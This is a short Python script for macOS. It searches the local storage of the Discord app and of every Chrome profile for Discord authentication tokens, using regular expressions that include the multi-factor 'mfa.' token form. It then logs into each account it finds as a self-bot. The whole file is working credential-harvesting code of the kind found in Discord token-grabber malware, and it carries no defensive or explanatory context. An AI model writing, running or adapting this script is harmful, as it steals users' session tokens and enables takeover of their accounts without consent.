import discord
from discord.ext import commands
import os
import re
import asyncio


class Bot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=".", self_bot=True)


    async def on_ready(self):
        print("Logged into", self.user)


    async def start(self, *args, **kwargs):
        try:
            await super().start(*args, **kwargs)
        except:
            pass


class macFinder():
    def __init__(self):
        self.tokens = []
        lib = f"/Users/{os.getlogin()}/Library/Application Support/"

        paths = {
        'Discord': lib + 'discord/Local Storage/leveldb',
        }
        for i in range(1, 100):
            path = lib + f"/Google/Chrome/Profile {i}/Local Storage/leveldb"
            if os.path.exists(path):
                paths[f'Google Chrome Profile {i}'] = path

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            tokens = self.find_tokens(path)

            for token in tokens:
                self.tokens.append(token)


    def find_tokens(self, path):
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens


tokens = macFinder().tokens
for token in tokens:
    bot = Bot()
    loop = asyncio.get_event_loop()
    loop.create_task(bot.start(token, bot=False))
loop.run_forever()
